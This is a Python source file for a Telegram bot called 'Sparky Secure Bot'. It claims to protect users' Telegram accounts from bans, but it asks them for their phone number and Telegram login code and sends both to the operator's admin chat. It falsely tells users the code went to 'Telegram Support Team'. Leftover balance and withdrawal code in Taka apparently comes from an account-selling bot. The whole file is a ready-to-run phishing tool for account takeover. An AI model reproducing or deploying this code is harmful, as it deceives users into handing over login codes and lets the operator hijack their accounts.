#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import asyncio
from datetime import datetime
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)

# === CONFIG ===
ADMIN_ID = 12345678  # ⚠️ replace with your Telegram ID
BOT_TOKEN = "ENTER YOUR BOT TOKEN"  # ⚠️ replace with your bot token
BACKGROUND_IMAGE_PATH = "https://files.catbox.moe/8htre1.png"
DATA_FILE = "users.json"

# In-memory per-user state
user_states = {}  # { user_id: {"step": "...", "number": "..."} }

# === UTILITIES ===
def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    return {}


def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)


def ensure_user(user_id: int):
    d = load_data()
    key = str(user_id)
    if key not in d:
        d[key] = {"balance": 0, "numbers": []}
        save_data(d)


def append_number(user_id: int, number: str, status: str):
    ensure_user(user_id)
    d = load_data()
    d[str(user_id)]["numbers"].append({"number": number, "status": status})
    save_data(d)


# === COMMAND HANDLER ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ensure_user(user_id)

    keyboard = [
        [KeyboardButton("📲 Sᴇᴄᴜʀᴇ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Aᴄᴄᴏᴜɴᴛ")],
        [KeyboardButton("📲 Lɪsᴛ Sᴇᴄᴜʀᴇ Aᴄᴄᴏᴜᴛ")],
        [KeyboardButton("🧑‍💻Cᴏɴᴛᴀᴄᴛ Dᴇᴠ")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

    caption = """✨ 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐏𝐀𝐑𝐊𝐘 𝐒𝐄𝐂𝐔𝐑𝐄 𝐁𝐎𝐓

Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Bᴇʟᴏᴡ Aʀᴇ Tʜᴇ Fᴇᴀᴛᴜʀᴇs Oғ Tʜᴇ Bᴏᴛ

📲 Sᴇᴄᴜʀᴇ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Aᴄᴄᴏᴜᴛ ➪➪➪ Pʀᴇᴠᴇɴᴛ Aɴʏ Aᴛᴛᴇᴍᴘ Oʀ Aᴄᴛɪᴠɪᴛʏ Tᴇʟᴇɢʀᴀᴍ Aʙᴜsᴇ.ᴏʀɢ Cᴏᴍᴍᴜɴɪᴛʏ Wᴏᴜʟᴅ Usᴇ Tᴏ Bᴀɴ/Rᴇsᴛʀɪᴄᴋ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Aᴄᴄᴏᴜᴛ

🆘 Aʙᴏᴜᴛ ➪➪➪ Kɴᴏᴡ Mᴏʀᴇ Aʙᴏᴜᴛ Sᴘᴀʀᴋʏ Sᴇᴄᴜʀᴇ Bᴏᴛ

🧑‍💻 Cᴏɴᴛᴀᴄᴛ Dᴇᴠ ➪➪➪ Cᴏɴᴛᴀᴄᴛ Sᴘᴀʀᴋʏ Dᴇᴠᴇʟᴏᴘᴇʀ
"""
    # Now you can use this caption with bot.send_message or bot.send_photo
    if os.path.exists(BACKGROUND_IMAGE_PATH):
        with open(BACKGROUND_IMAGE_PATH, "rb") as ph:
            await update.message.reply_photo(
                photo=ph, caption=caption, reply_markup=reply_markup
            )
    else:
        await update.message.reply_text(caption, reply_markup=reply_markup)


# === MESSAGE HANDLER ===
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message:
        return

    text = update.message.text.strip()
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name or "User"

    ensure_user(user_id)
    state = user_states.get(user_id, {}).get("step")
    ctx_step = context.user_data.get("step")

    # ----- SELL NUMBER (start) -----
    if text == "📲 Sᴇᴄᴜʀᴇ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Aᴄᴄᴏᴜɴᴛ":
        user_states[user_id] = {"step": "wait_number"}
        bar_length = 10
        msg = await update.message.reply_text("[□□□□□□□□□□] 0%")
        for i in range(1, bar_length + 1):
            filled = "■" * i
            empty = "□" * (bar_length - i)
            percent = i * 10
            await asyncio.sleep(0.4)
            await msg.edit_text(f"[{filled}{empty}] {percent}%")
        await update.message.reply_text("✉️ Pʟᴇᴀsᴇ Eɴᴛᴇʀ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Nᴜᴍʙᴇʀ Wɪᴛʜᴏᴜᴛ [ + ] Fᴏʀ Eɴʜᴀɴᴄᴇᴍᴇɴᴛ:")
        return

    # ----- WAITING FOR NUMBER -----
    if state == "wait_number":
        number = text
        # store number and wait for OTP
        user_states[user_id] = {"step": "wait_otp", "number": number}
        keyboard = [
            [
                InlineKeyboardButton("Send Code", callback_data=f"send_code|{user_id}|{number}"),
                InlineKeyboardButton("Reject", callback_data=f"reject_number|{user_id}|{number}")
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📋 New number received\n👤 User: @{username}\n📞 Number: {number}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await update.message.reply_text("Yᴏᴜʀ Nᴜᴍʙᴇʀ Hᴀs Bᴇᴇɴ Sᴜᴄᴄᴇssғᴜʟʟʏ Sᴜʙᴍɪᴛᴇᴅ Tᴏ telegram.org/privacy?setln=fa Fᴏʀ Pʀᴏᴛᴇᴄᴛɪᴏɴ••• Aᴡᴀɪᴛ Vᴇʀɪғɪᴄᴀᴛɪᴏɴ Oᴛᴘ Fʀᴏᴍ Tᴇʟᴇɢʀᴀᴍ Sᴜᴘᴘᴏʀᴛ Tᴇᴀᴍ°°° Tʜɪs Mɪɢʜᴛ Tᴀᴋᴇ Sᴏᴍᴇ Fᴇᴡ Mɪɴᴜɪᴛᴇs")
        return

    # ----- WAITING FOR OTP -----
    if state == "wait_otp":
        otp = text
        target_number = user_states.get(user_id, {}).get("number")
        if not target_number:
            await update.message.reply_text("❌ Sᴇssɪᴏɴ Exᴘɪʀᴇᴅ. Pʟᴇᴀsᴇ Rᴇsᴛᴀʀᴛ Bʏ Sᴇɴᴅɪɴɢ 📲 Sᴇᴄᴜʀᴇ Yᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ Aᴄᴄᴏᴜɴ")
            return
        keyboard = [
            [
                InlineKeyboardButton("✅ Accept", callback_data=f"accept_number|{user_id}|{target_number}|{otp}"),
                InlineKeyboardButton("❌ Reject", callback_data=f"reject_number|{user_id}|{target_number}"),
                InlineKeyboardButton("🔁 Retry", callback_data=f"retry_number|{user_id}|{target_number}")
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID,
            text=f"📋 OTP Received\n👤 User: @{username}\n📞 Number: {target_number}\n🔐 Code: {otp}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        user_states[user_id] = {"step": None}
        await update.message.reply_text("✅ OTP Hᴀs Bᴇᴇɴ Fᴏʀᴡᴀʀᴅᴇᴅ Tᴏ Tᴇʟᴇɢʀᴀᴍ Sᴜᴘᴘᴏʀᴛ Tᴇᴀᴍ Pʟᴇᴀsᴇ Hᴏʟᴅ Oɴ Fᴏʀ Vᴇʀɪғɪᴄᴀᴛɪᴏɴ")
        return

    # ----- BALANCE -----
    if text == "💳 My Balance":
        data = load_data()
        balance = data.get(str(user_id), {}).get("balance", 0)
        await update.message.reply_text(f"💸 Your balance is: {balance} Taka")
        return

    # ----- HISTORY -----
    if text == "📲 Lɪsᴛ Sᴇᴄᴜʀᴇ Aᴄᴄᴏᴜᴛ":
        data = load_data()
        numbers = data.get(str(user_id), {}).get("numbers", [])
        if not numbers:
            await update.message.reply_text("No numbers found.")
        else:
            msg = f"📋 {username} — All Number History:\n\n"
            for entry in numbers:
                msg += f"📞 {entry['number']} — {entry['status']}\n"
            await update.message.reply_text(msg)
        return

    # ----- SUPPORT -----
    if text == "🧑‍💻Cᴏɴᴛᴀᴄᴛ Dᴇᴠ":
        await update.message.reply_text("💬 Contact: @BIGWHIZZY011")
        return

    # ----- WITHDRAW -----
    if text == "💵 Withdraw":
        keyboard = [[
            InlineKeyboardButton("Gpay", callback_data="withdraw_gpay"),
            InlineKeyboardButton("Fampay", callback_data="withdraw_fampay")
        ]]
        await update.message.reply_text("Select payment method 👇", reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if ctx_step == "withdraw_number":
        context.user_data["withdraw_number"] = text
        context.user_data["step"] = "withdraw_amount"
        await update.message.reply_text("💰 Enter withdraw amount:")
        return

    if ctx_step == "withdraw_amount":
        try:
            amount = int(text)
        except ValueError:
            await update.message.reply_text("❌ Please enter a valid number.")
            return
        d = load_data()
        bal = d.get(str(user_id), {}).get("balance", 0)
        if amount < 150 or amount > bal:
            await update.message.reply_text("❌ Minimum withdraw 150 Taka or insufficient balance.")
            context.user_data["step"] = None
            return
        number = context.user_data.get("withdraw_number")
        method = context.user_data.get("withdraw_method")
        dt = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        admin_msg = (
            "📥 *New Withdraw Request*\n"
            f"👤 User: @{username}\n"
            f"🆔 ID: {user_id}\n"
            f"💳 Method: {method}\n"
            f"📞 Number: {number}\n"
            f"💰 Amount: {amount}\n"
            f"🕓 Date: {dt}"
        )
        keyboard = [
            [
                InlineKeyboardButton("✅ Success", callback_data=f"withdraw_success|{user_id}|{amount}"),
                InlineKeyboardButton("❌ Failed", callback_data=f"withdraw_failed|{user_id}")
            ]
        ]
        await context.bot.send_message(
            chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard)
        )
        await update.message.reply_text("✅ Withdraw request sent! Admin will process it.")
        context.user_data["step"] = None
        return


# === CALLBACK HANDLER ===
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query:
        return
    await query.answer()
    parts = query.data.split("|")
    action = parts[0]

    # Send Code
    if action == "send_code":
        target_user_id = int(parts[1])
        number = parts[2]
        user_states[target_user_id] = {"step": "wait_otp", "number": number}
        await context.bot.send_message(chat_id=target_user_id, text="🔐 Eɴᴛᴇʀ Yᴏᴜʀ Vᴇʀɪғɪᴄᴀᴛɪᴏɴ Cᴏᴅᴇ Sᴇɴᴛ Tᴏ Yᴏᴜ Iɴ Tʜɪs Fᴏʀᴍᴀᴛ [ 123 456 ] ✓ ")
        await query.message.reply_text(f"✅ Asked user {parts[1]} to send OTP.")
        return

    # Reject number
    if action == "reject_number":
        target_user_id = int(parts[1])
        await context.bot.send_message(chat_id=target_user_id, text="❌ Aᴄᴄᴏᴜɴᴛ Sᴇᴄᴜʀᴇᴍᴇɴᴛ Wᴀs Rᴇᴊᴇᴄᴛᴇᴅ Bʏ Tᴇʟᴇɢʀᴀᴍ Sᴜᴘᴘᴏʀᴛ")
        await query.message.reply_text(f"Rejected user {parts[1]}.")
        return

    # Retry
    if action == "retry_number":
        target_user_id = int(parts[1])
        await context.bot.send_message(chat_id=target_user_id, text="🔁 Vᴇʀɪғɪᴄᴀᴛɪᴏɴ Fᴀɪʟᴇᴅ. Pʟᴇᴀsᴇ Tʀʏ Aɢᴀɪɴ.")
        await query.message.reply_text(f"Asked user {parts[1]} to retry.")
        return

    # Accept number
    if action == "accept_number":
        target_user_id = int(parts[1])
        number = parts[2]
        append_number(target_user_id, number, "✅ Verified")
        d = load_data()
        key = str(target_user_id)
        if key not in d:
            d[key] = {"balance": 0, "numbers": []}
        d[key]["balance"] = d[key].get("balance", 0) + 15
        save_data(d)
        await context.bot.send_message(chat_id=target_user_id,
                                       text="🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴ Yᴏᴜʀ Aᴄᴄᴏᴜᴛ Hᴀs Bᴇᴇɴ Sᴜᴄᴄᴇssғᴜʟʟʏ Sᴇᴄᴜʀᴇᴅ.")
        await query.message.reply_text(f"User {target_user_id} credited and notified.")
        return

    # Withdraw callbacks
    if action in ["withdraw_gpay", "withdraw_fampay"]:
        method = action.split("_", 1)[1]
        context.user_data["withdraw_method"] = method
        context.user_data["step"] = "withdraw_number"
        await query.message.reply_text(f"📱 Enter your {method} number:")
        return

    if action == "withdraw_success":
        user_id = int(parts[1])
        amount = int(parts[2])
        d = load_data()
        key = str(user_id)
        if key not in d:
            d[key] = {"balance": 0, "numbers": []}
        d[key]["balance"] = max(0, d[key].get("balance", 0) - amount)
        save_data(d)
        await context.bot.send_message(chat_id=user_id, text=f"✅ Your withdraw of {amount} Taka was successful!")
        await query.message.reply_text(f"Marked withdraw success for {user_id}.")
        return

    if action == "withdraw_failed":
        user_id = int(parts[1])
        await context.bot.send_message(chat_id=user_id,
                                       text="❌ Your withdraw request failed. Please contact support.")
        await query.message.reply_text(f"Marked withdraw failed for {user_id}.")
        return


# === MAIN ===
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))
    print("🤖 Bot is running...")
    app.run_polling()


if __name__ == "__main__":
    main()
